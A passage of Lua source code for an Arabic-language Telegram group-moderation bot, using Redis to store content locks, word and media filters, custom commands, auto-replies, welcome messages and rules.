local u = LuaTele.getUser(msg.sender.user_id)
local txx = " • عذرآ عزيزي ↤ 𓆩["..u.first_name.."](tg://user?id="..u.id..")𓆪\n• *ممنوع ارسال المعرفات*"
if UserName_Group == "del" then
LuaTele.sendText(msg.chat_id,0,txx,"md",true)
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif UserName_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif UserName_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif UserName_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is username ')
end
if text and text:match("#[%a%d_]+") and not msg.Special then 
local Hashtak_Group = Redis:get(LaRiCa.."Lock:hashtak"..msg_chat_id)
local u = LuaTele.getUser(msg.sender.user_id)
local txx = " • عذرآ عزيزي ↤ 𓆩["..u.first_name.."](tg://user?id="..u.id..")𓆪\n• *ممنوع ارسال الهاشتاق*"
if Hashtak_Group == "del" then
LuaTele.sendText(msg.chat_id,0,txx,"md",true)
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Hashtak_Group == "ked" then
return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Hashtak_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Hashtak_Group == "kick" then
return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is hashtak ')
end
if text and text:match("/[%a%d_]+") and not msg.Special then 
local comd_Group = Redis:get(LaRiCa.."Lock:Cmd"..msg_chat_id)
if comd_Group == "del" then
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif comd_Group == "ked" then
return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif comd_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif comd_Group == "kick" then
return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end end
if (Redis:get(LaRiCa..'FilterText'..msg_chat_id..':'..msg.sender.user_id) == 'true') then
if text or msg.content.photo or msg.content.animation or msg.content.sticker then
if msg.content.photo then
Filters = 'صوره'
Redis:sadd(LaRiCa.."List:Filter"..msg_chat_id,'photo:'..msg.content.photo.sizes[1].photo.id)  
Redis:set(LaRiCa.."Filter:Text"..msg.sender.user_id..':'..msg_chat_id, msg.content.photo.sizes[1].photo.id)  
elseif msg.content.animation then
Filters = 'متحركه'
Redis:sadd(LaRiCa.."List:Filter"..msg_chat_id,'animation:'..msg.content.animation.animation.id)  
Redis:set(LaRiCa.."Filter:Text"..msg.sender.user_id..':'..msg_chat_id, msg.content.animation.animation.id)  
elseif msg.content.sticker then
Filters = 'ملصق'
Redis:sadd(LaRiCa.."List:Filter"..msg_chat_id,'sticker:'..msg.content.sticker.sticker.id)  
Redis:set(LaRiCa.."Filter:Text"..msg.sender.user_id..':'..msg_chat_id, msg.content.sticker.sticker.id)  
elseif text then
Redis:set(LaRiCa.."Filter:Text"..msg.sender.user_id..':'..msg_chat_id, text)  
Redis:sadd(LaRiCa.."List:Filter"..msg_chat_id,'text:'..text)  
Filters = 'نص'
end
Redis:set(LaRiCa..'FilterText'..msg_chat_id..':'..msg.sender.user_id,'true1')
return LuaTele.sendText(msg_chat_id,msg_id,"\n• ارسل تحذير ( "..Filters.." ) عند ارساله","md",true)  
end end
if text and (Redis:get(LaRiCa..'FilterText'..msg_chat_id..':'..msg.sender.user_id) == 'true1') then
local Text_Filter = Redis:get(LaRiCa.."Filter:Text"..msg.sender.user_id..':'..msg_chat_id)  
if Text_Filter then   
Redis:set(LaRiCa.."Filter:Group:"..Text_Filter..msg_chat_id,text)  
end  
Redis:del(LaRiCa.."Filter:Text"..msg.sender.user_id..':'..msg_chat_id)  
Redis:del(LaRiCa..'FilterText'..msg_chat_id..':'..msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,"\n• تم اضافه رد التحذير","md",true)  
end
if text and (Redis:get(LaRiCa..'FilterText'..msg_chat_id..':'..msg.sender.user_id) == 'DelFilter') then   
if text or msg.content.photo or msg.content.animation or msg.content.sticker then
if msg.content.photo then
Filters = 'الصوره'
Redis:srem(LaRiCa.."List:Filter"..msg_chat_id,'photo:'..msg.content.photo.sizes[1].photo.id)  
Redis:del(LaRiCa.."Filter:Group:"..msg.content.photo.sizes[1].photo.id..msg_chat_id)  
elseif msg.content.animation then
Filters = 'المتحركه'
Redis:srem(LaRiCa.."List:Filter"..msg_chat_id,'animation:'..msg.content.animation.animation.id)  
Redis:del(LaRiCa.."Filter:Group:"..msg.content.animation.animation.id..msg_chat_id)  
elseif msg.content.sticker then
Filters = 'الملصق'
Redis:srem(LaRiCa.."List:Filter"..msg_chat_id,'sticker:'..msg.content.sticker.sticker.id)  
Redis:del(LaRiCa.."Filter:Group:"..msg.content.sticker.sticker.id..msg_chat_id)  
elseif text then
Redis:srem(LaRiCa.."List:Filter"..msg_chat_id,'text:'..text)  
Redis:del(LaRiCa.."Filter:Group:"..text..msg_chat_id)  
Filters = 'النص'
end
Redis:del(LaRiCa..'FilterText'..msg_chat_id..':'..msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم الغاء منع ("..Filters..")","md",true)  
end end
if text or msg.content.photo or msg.content.animation or msg.content.sticker then
if msg.content.photo then
DelFilters = msg.content.photo.sizes[1].photo.id
statusfilter = 'الصوره'
elseif msg.content.animation then
DelFilters = msg.content.animation.animation.id
statusfilter = 'المتحركه'
elseif msg.content.sticker then
DelFilters = msg.content.sticker.sticker.id
statusfilter = 'الملصق'
elseif text then
DelFilters = text
statusfilter = 'الرساله'
end
local ReplyFilters = Redis:get(LaRiCa.."Filter:Group:"..DelFilters..msg_chat_id)
if ReplyFilters and not msg.Dev then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
return LuaTele.sendText(msg_chat_id,msg_id,"*• لقد تم منع هذه ( "..statusfilter.." ) هنا*\n•"..ReplyFilters,"md",true)   
end end
if text and Redis:get(LaRiCa.."All:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id) == "true" then
local NewCmmd = Redis:get(LaRiCa.."All:Get:Reides:Commands:Group"..text)
if NewCmmd then
Redis:del(LaRiCa.."All:Get:Reides:Commands:Group"..text)
Redis:del(LaRiCa.."All:Command:Reids:Group:New"..msg_chat_id)
Redis:srem(LaRiCa.."All:Command:List:Group",text)
LuaTele.sendText(msg_chat_id,msg_id,"• تم ازالة هاذا ← { "..text.." }","md",true)
else
LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد امر بهاذا الاسم","md",true)
end
Redis:del(LaRiCa.."All:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id)
return false
end
if text and Redis:get(LaRiCa.."All:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id) == "true" then
Redis:set(LaRiCa.."All:Command:Reids:Group:New"..msg_chat_id,text)
Redis:del(LaRiCa.."All:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id)
Redis:set(LaRiCa.."All:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id,"true1") 
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل الامر الجديد ليتم وضعه مكان القديم","md",true)  
end
if text and Redis:get(LaRiCa.."All:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id) == "true1" then
local NewCmd = Redis:get(LaRiCa.."All:Command:Reids:Group:New"..msg_chat_id)
Redis:set(LaRiCa.."All:Get:Reides:Commands:Group"..text,NewCmd)
Redis:sadd(LaRiCa.."All:Command:List:Group",text)
Redis:del(LaRiCa.."All:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حفظ الامر باسم ← { "..text..' }',"md",true)
end
if text then if text:match("^all (.*)$") or text:match("^@all (.*)$") or text == "@all" or text == "all" or text == "نداء" then 
local ttag = text:match("^all (.*)$") or text:match("^@all (.*)$") 
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n• هذا الامر يخص \n• ↤𓆩*'..Controller_Num(6)..'*𓆪بس',"md",true)  
end
if Redis:get(LaRiCa.."lockalllll"..msg_chat_id) == "off" then
return LuaTele.sendText(msg_chat_id,msg_id,'*• تم تعطيل @all من قبل المدراء*',"md",true)  
end
local Info_Members = LuaTele.searchChatMembers(msg_chat_id, "*", 10000)
x = 0 
tags = 0 
local list = Info_Members.members
for k, v in pairs(list) do 
local data = LuaTele.getUser(v.member_id.user_id)
if x == 5 or x == tags or k == 0 then 
tags = x + 5 
if ttag then
t = "#all "..ttag.."" 
else
t = "#all "
end end 
x = x + 1 
tagname = data.first_name
tagname = tagname:gsub("]","") 
tagname = tagname:gsub("[[]","") 
t = t..", ["..tagname.."](tg://user?id="..v.member_id.user_id..")" 
if x == 5 or x == tags or k == 0 then 
if ttag then
Text = t:gsub('#all '..ttag..',','#all '..ttag..'\n') 
else 
Text = t:gsub('#all,','#all\n')
end
sendText(msg_chat_id,Text,0,'md') 
end end end end

if text and Redis:get(LaRiCa.."Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id) == "true" then
local NewCmmd = Redis:get(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..text)
if NewCmmd then
Redis:del(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..text)
Redis:del(LaRiCa.."Command:Reids:Group:New"..msg_chat_id)
Redis:srem(LaRiCa.."Command:List:Group"..msg_chat_id,text)
LuaTele.sendText(msg_chat_id,msg_id,"• تم ازالة هاذا ← { "..text.." }","md",true)
else
LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد امر بهاذا الاسم","md",true)
end
Redis:del(LaRiCa.."Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id)
return false
end
if text and Redis:get(LaRiCa.."Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id) == "true" then
Redis:set(LaRiCa.."Command:Reids:Group:New"..msg_chat_id,text)
Redis:del(LaRiCa.."Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id)
Redis:set(LaRiCa.."Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id,"true1") 
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل الامر الجديد ليتم وضعه مكان القديم","md",true)  
end
if text and Redis:get(LaRiCa.."Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id) == "true1" then
local NewCmd = Redis:get(LaRiCa.."Command:Reids:Group:New"..msg_chat_id)
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..text,NewCmd)
Redis:sadd(LaRiCa.."Command:List:Group"..msg_chat_id,text)
Redis:del(LaRiCa.."Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حفظ الامر باسم ← { "..text..' }',"md",true)
end
if Redis:get(LaRiCa.."Set:Link"..msg_chat_id..""..msg.sender.user_id) then
if text == "الغاء" then
Redis:del(LaRiCa.."Set:Link"..msg_chat_id..""..msg.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"•  تم الغاء حفظ الرابط","md",true) 
end
Redis:set(LaRiCa.."Group:Link"..msg_chat_id,text)
Redis:del(LaRiCa.."Set:Link"..msg_chat_id..""..msg.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"•  تم حفظ الرابط بنجاح","md",true) 
end 
if Redis:get(LaRiCa.."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id) then 
if text == "الغاء" then 
Redis:del(LaRiCa.."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id)  
return LuaTele.sendText(msg_chat_id,msg_id,"• تم الغاء حفظ الترحيب","md",true)   
end 
Redis:del(LaRiCa.."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id)  
Redis:set(LaRiCa.."Welcome:Group"..msg_chat_id,text) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حفظ ترحيب الكروب","md",true) 
end
if Redis:get(LaRiCa.."Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" then 
Redis:del(LaRiCa.."Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم الغاء حفظ القوانين","md",true)   
end 
Redis:set(LaRiCa.."Group:Rules" .. msg_chat_id,text) 
Redis:del(LaRiCa.."Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حفظ قوانين الكروب","md",true)  
end  
if Redis:get(LaRiCa.."Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" then 
Redis:del(LaRiCa.."Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم الغاء حفظ وصف الكروب","md",true)   
end 
LuaTele.setChatDescription(msg_chat_id,text) 
Redis:del(LaRiCa.."Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حفظ وصف الكروب","md",true)  
end  
if Redis:get(LaRiCa.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id) == "true1" then
Redis:del(LaRiCa.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id)
if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then
local test = Redis:get(LaRiCa.."Text:Manager"..msg.sender.user_id..":"..msg_chat_id)
if msg.content.text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(LaRiCa.."Add:Rd:Manager:Text"..test..msg_chat_id, text)  
elseif msg.content.sticker then   
Redis:set(LaRiCa.."Add:Rd:Manager:Stekrs"..test..msg_chat_id, msg.content.sticker.sticker.remote.id)  
elseif msg.content.voice_note then  
Redis:set(LaRiCa.."Add:Rd:Manager:Vico"..test..msg_chat_id, msg.content.voice_note.voice.remote.id)  
elseif msg.content.audio then
Redis:set(LaRiCa.."Add:Rd:Manager:Audio"..test..msg_chat_id, msg.content.audio.audio.remote.id)  
Redis:set(LaRiCa.."Add:Rd:Manager:Audioc"..test..msg_chat_id, msg.content.caption.text)  
elseif msg.content.document then
Redis:set(LaRiCa.."Add:Rd:Manager:File"..test..msg_chat_id, msg.content.document.document.remote.id)  
elseif msg.content.animation then
Redis:set(LaRiCa.."Add:Rd:Manager:Gif"..test..msg_chat_id, msg.content.animation.animation.remote.id)  
elseif msg.content.video_note then
Redis:set(LaRiCa.."Add:Rd:Manager:video_note"..test..msg_chat_id, msg.content.video_note.video.remote.id)  
elseif msg.content.video then
Redis:set(LaRiCa.."Add:Rd:Manager:Video"..test..msg_chat_id, msg.content.video.video.remote.id)  
Redis:set(LaRiCa.."Add:Rd:Manager:Videoc"..test..msg_chat_id, msg.content.caption.text)  
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
Redis:set(LaRiCa.."Add:Rd:Manager:Photo"..test..msg_chat_id, idPhoto)  
Redis:set(LaRiCa.."Add:Rd:Manager:Photoc"..test..msg_chat_id, msg.content.caption.text)  
end
LuaTele.sendText(msg_chat_id,msg_id,"• تم حفظ الرد","md",true)  
return false  
end  
end
if text and text:match("^(.*)$") then
if Redis:get(LaRiCa.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id) == "true" then
Redis:set(LaRiCa.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id,"true1")
Redis:set(LaRiCa.."Text:Manager"..msg.sender.user_id..":"..msg_chat_id, text)
Redis:del(LaRiCa.."Add:Rd:Manager:Gif"..text..msg_chat_id)   
Redis:del(LaRiCa.."Add:Rd:Manager:Vico"..text..msg_chat_id)   
Redis:del(LaRiCa.."Add:Rd:Manager:Stekrs"..text..msg_chat_id) 
Redis:del(LaRiCa.."Add:Rd:Manager:Text"..text..msg_chat_id)   
Redis:del(LaRiCa.."Add:Rd:Manager:Photo"..text..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Photoc"..text..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Video"..text..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Videoc"..text..msg_chat_id)  
Redis:del(LaRiCa.."Add:Rd:Manager:File"..text..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:video_note"..text..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Audio"..text..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Audioc"..text..msg_chat_id)
Redis:sadd(LaRiCa.."List:Manager"..msg_chat_id.."", text)
LuaTele.sendText(msg_chat_id,msg_id,[[
↯︙ارسل لي الرد سواء كان 
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
↯︙يمكنك اضافة الى النص •
━━━━━━━━━━━━
 `#username`  ˓  معرف المستخدم
 `#msgs`  ˓  عدد الرسائل
 `#name`  ˓  اسم المستخدم
 `#id`  ˓  ايدي المستخدم
 `#stast`  ˓  رتبة المستخدم
 `#edit`  ˓  عدد التعديلات
]],"md",true)  
return false
end end
if text and text:match("^(.*)$") then
if Redis:get(LaRiCa.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id.."") == "true2" then
Redis:del(LaRiCa.."Add:Rd:Manager:Gif"..text..msg_chat_id)   
Redis:del(LaRiCa.."Add:Rd:Manager:Vico"..text..msg_chat_id)   
Redis:del(LaRiCa.."Add:Rd:Manager:Stekrs"..text..msg_chat_id) 
Redis:del(LaRiCa.."Add:Rd:Manager:Text"..text..msg_chat_id)   
Redis:del(LaRiCa.."Add:Rd:Manager:Photo"..text..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Photoc"..text..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Video"..text..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Videoc"..text..msg_chat_id)  
Redis:del(LaRiCa.."Add:Rd:Manager:File"..text..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Audio"..text..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:Audioc"..text..msg_chat_id)
Redis:del(LaRiCa.."Add:Rd:Manager:video_note"..text..msg_chat_id)
Redis:del(LaRiCa.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id)
Redis:srem(LaRiCa.."List:Manager"..msg_chat_id.."", text)
LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف الرد من الردود ","md",true)  
return false
end end
if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo and msg.sender.user_id ~= LaRiCa then
local test = Redis:get(LaRiCa.."Text:Sudo:Bot"..msg.sender.user_id..":"..msg_chat_id)
if Redis:get(LaRiCa.."Set:Rd"..msg.sender.user_id..":"..msg_chat_id) == "true1" then
Redis:del(LaRiCa.."Set:Rd"..msg.sender.user_id..":"..msg_chat_id)
if msg.content.text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(LaRiCa.."Add:Rd:Sudo:Text"..test, text)  
elseif msg.content.sticker then   
Redis:set(LaRiCa.."Add:Rd:Sudo:stekr"..test, msg.content.sticker.sticker.remote.id)  
elseif msg.content.voice_note then  
Redis:set(LaRiCa.."Add:Rd:Sudo:vico"..test, msg.content.voice_note.voice.remote.id)  
elseif msg.content.animation then   
Redis:set(LaRiCa.."Add:Rd:Sudo:Gif"..test, msg.content.animation.animation.remote.id)  
elseif msg.content.audio then
Redis:set(LaRiCa.."Add:Rd:Sudo:Audio"..test, msg.content.audio.audio.remote.id)  
Redis:set(LaRiCa.."Add:Rd:Sudo:Audioc"..test, msg.content.caption.text)  
elseif msg.content.document then
Redis:set(LaRiCa.."Add:Rd:Sudo:File"..test, msg.content.document.document.remote.id)  
elseif msg.content.video then
Redis:set(LaRiCa.."Add:Rd:Sudo:Video"..test, msg.content.video.video.remote.id)  
Redis:set(LaRiCa.."Add:Rd:Sudo:Videoc"..test, msg.content.caption.text)  
elseif msg.content.video_note then
Redis:set(LaRiCa.."Add:Rd:Sudo:video_note"..test..msg_chat_id, msg.content.video_note.video.remote.id)  
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
Redis:set(LaRiCa.."Add:Rd:Sudo:Photo"..test, idPhoto)  
Redis:set(LaRiCa.."Add:Rd:Sudo:Photoc"..test, msg.content.caption.text)  
end
LuaTele.sendText(msg_chat_id,msg_id,"• تم حفظ الرد \n• ارسل ( "..test.." ) لرئية الرد","md",true)  
return false
end  end
if text and text:match("^(.*)$") then
if Redis:get(LaRiCa.."Set:Rd"..msg.sender.user_id..":"..msg_chat_id) == "true" then
Redis:set(LaRiCa.."Set:Rd"..msg.sender.user_id..":"..msg_chat_id, "true1")
Redis:set(LaRiCa.."Text:Sudo:Bot"..msg.sender.user_id..":"..msg_chat_id, text)
Redis:sadd(LaRiCa.."List:Rd:Sudo", text)
LuaTele.sendText(msg_chat_id,msg_id,[[
↯︙ارسل لي الرد سواء كان 
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
↯︙يمكنك اضافة الى النص •
━━━━━━━━━━━━
 `#username`  ˓  معرف المستخدم
 `#msgs`  ˓  عدد الرسائل
 `#name`  ˓  اسم المستخدم
 `#id`  ˓  ايدي المستخدم
 `#stast`  ˓  رتبة المستخدم
 `#edit`  ˓  عدد التعديلات
]],"md",true)  
return false
end end
if text and text:match("^(.*)$") then
if Redis:get(LaRiCa.."Set:On"..msg.sender.user_id..":"..msg_chat_id) == "true" then
list = {"Add:Rd:Sudo:video_note","Add:Rd:Sudo:Audio","Add:Rd:Sudo:Audioc","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Videoc","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Photoc","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
Redis:del(LaRiCa..''..v..text)
end
Redis:del(LaRiCa.."Set:On"..msg.sender.user_id..":"..msg_chat_id)
Redis:srem(LaRiCa.."List:Rd:Sudo", text)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف الرد من الردود العامه","md",true)  
end end
if text and not Redis:get(LaRiCa.."Status:ReplySudo"..msg_chat_id) then
if not Redis:sismember(LaRiCa..'Spam:Group'..msg.sender.user_id,text) then
local anemi = Redis:get(LaRiCa.."Add:Rd:Sudo:Gif"..text)   
local veico = Redis:get(LaRiCa.."Add:Rd:Sudo:vico"..text)   
local stekr = Redis:get(LaRiCa.."Add:Rd:Sudo:stekr"..text) 
local Text = Redis:get(LaRiCa.."Add:Rd:Sudo:Text"..text)   
local photo = Redis:get(LaRiCa.."Add:Rd:Sudo:Photo"..text)
local photoc = Redis:get(LaRiCa.."Add:Rd:Sudo:Photoc"..text)
local video = Redis:get(LaRiCa.."Add:Rd:Sudo:Video"..text)
local videoc = Redis:get(LaRiCa.."Add:Rd:Sudo:Videoc"..text)
local document = Redis:get(LaRiCa.."Add:Rd:Sudo:File"..text)
local audio = Redis:get(LaRiCa.."Add:Rd:Sudo:Audio"..text)
local audioc = Redis:get(LaRiCa.."Add:Rd:Sudo:Audioc"..text)
local video_note = Redis:get(LaRiCa.."Add:Rd:Sudo:video_note"..text)
if Text then 
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local NumMsg = Redis:get(LaRiCa..'Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = msg.Name_Controller
local NumMessageEdit = Redis:get(LaRiCa..'Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
local Text = Text:gsub('#username',(UserInfo.username or 'لا يوجد')) 
local Text = Text:gsub('#name',UserInfo.first_name)
local Text = Text:gsub('#id',msg.sender.user_id)
local Text = Text:gsub('#edit',NumMessageEdit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
LuaTele.sendText(msg_chat_id,msg_id,'['..Text..']',"md",true)  
end
if video_note then
LuaTele.sendVideoNote(msg_chat_id, msg.id, video_note)
Redis:sadd(LaRiCa.."Spam:Group"..msg.sender.user_id,text) 
end
if photo then
LuaTele.sendPhoto(msg.chat_id, msg.id, photo,photoc)
Redis:sadd(LaRiCa.."Spam:Group"..msg.sender.user_id,text) 
end  
if stekr then 
LuaTele.sendSticker(msg_chat_id, msg.id, stekr)
Redis:sadd(LaRiCa.."Spam:Group"..msg.sender.user_id,text) 
end
if veico then 
LuaTele.sendVoiceNote(msg_chat_id, msg.id, veico, '', 'md')
Redis:sadd(LaRiCa.."Spam:Group"..msg.sender.user_id,text) 
end
if video then 
LuaTele.sendVideo(msg_chat_id, msg.id, video, videoc, "md")
Redis:sadd(LaRiCa.."Spam:Group"..msg.sender.user_id,text) 
end
if anemi then 
LuaTele.sendAnimation(msg_chat_id,msg.id, anemi, '', 'md')
Redis:sadd(LaRiCa.."Spam:Group"..msg.sender.user_id,text) 
end
if document then
LuaTele.sendDocument(msg_chat_id, msg.id, document, '', 'md')
Redis:sadd(LaRiCa.."Spam:Group"..msg.sender.user_id,text) 
end  
if audio then
LuaTele.sendAudio(msg_chat_id, msg.id, audio, audioc, "md") 
Redis:sadd(LaRiCa.."Spam:Group"..msg.sender.user_id,text) 
end end end
if text and not Redis:get(LaRiCa.."Status:Reply"..msg_chat_id) then
local anemi = Redis:get(LaRiCa.."Add:Rd:Manager:Gif"..text..msg_chat_id)   
local veico = Redis:get(LaRiCa.."Add:Rd:Manager:Vico"..text..msg_chat_id)   
local stekr = Redis:get(LaRiCa.."Add:Rd:Manager:Stekrs"..text..msg_chat_id) 
local Texingt = Redis:get(LaRiCa.."Add:Rd:Manager:Text"..text..msg_chat_id)   
local photo = Redis:get(LaRiCa.."Add:Rd:Manager:Photo"..text..msg_chat_id)
local photoc = Redis:get(LaRiCa.."Add:Rd:Manager:Photoc"..text..msg_chat_id)
local video = Redis:get(LaRiCa.."Add:Rd:Manager:Video"..text..msg_chat_id)
local videoc = Redis:get(LaRiCa.."Add:Rd:Manager:Videoc"..text..msg_chat_id)  
local document = Redis:get(LaRiCa.."Add:Rd:Manager:File"..text..msg_chat_id)
local audio = Redis:get(LaRiCa.."Add:Rd:Manager:Audio"..text..msg_chat_id)
local audioc = Redis:get(LaRiCa.."Add:Rd:Manager:Audioc"..text..msg_chat_id)
local video_note = Redis:get(LaRiCa.."Add:Rd:Manager:video_note"..text..msg_chat_id)
if Texingt then 
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local NumMsg = Redis:get(LaRiCa..'Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
local TotalMsg = Total_message(NumMsg) 
local Status_Gps = msg.Name_Controller
local NumMessageEdit = Redis:get(LaRiCa..'Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
local Texingt = Texingt:gsub('#username',(UserInfo.username or 'لا يوجد')) 
local Texingt = Texingt:gsub('#name',UserInfo.first_name)
local Texingt = Texingt:gsub('#id',msg.sender.user_id)
local Texingt = Texingt:gsub('#edit',NumMessageEdit)
local Texingt = Texingt:gsub('#msgs',NumMsg)
local Texingt = Texingt:gsub('#stast',Status_Gps)
LuaTele.sendText(msg_chat_id,msg_id,'['..Texingt..']',"md",true)  
end
if video_note then
LuaTele.sendVideoNote(msg_chat_id, msg.id, video_note)
end
if photo then
LuaTele.sendPhoto(msg.chat_id, msg.id, photo,photoc)
end  
if stekr then 
LuaTele.sendSticker(msg_chat_id, msg.id, stekr)
end
if veico then 
LuaTele.sendVoiceNote(msg_chat_id, msg.id, veico, '', 'md')
end
if video then 
LuaTele.sendVideo(msg_chat_id, msg.id, video, videoc, "md")
end
if anemi then 
LuaTele.sendAnimation(msg_chat_id,msg.id, anemi, '', 'md')
end
if document then
LuaTele.sendDocument(msg_chat_id, msg.id, document, '', 'md')
end  
if audio then
LuaTele.sendAudio(msg_chat_id, msg.id, audio, audioc, "md") 
end end
if Redis:get(LaRiCa.."LaRiCa:Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء الامر •' then   
Redis:del(LaRiCa.."LaRiCa:Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id, "\n• تم الغاء الاذاعه للمجموعات","md",true)  
end 
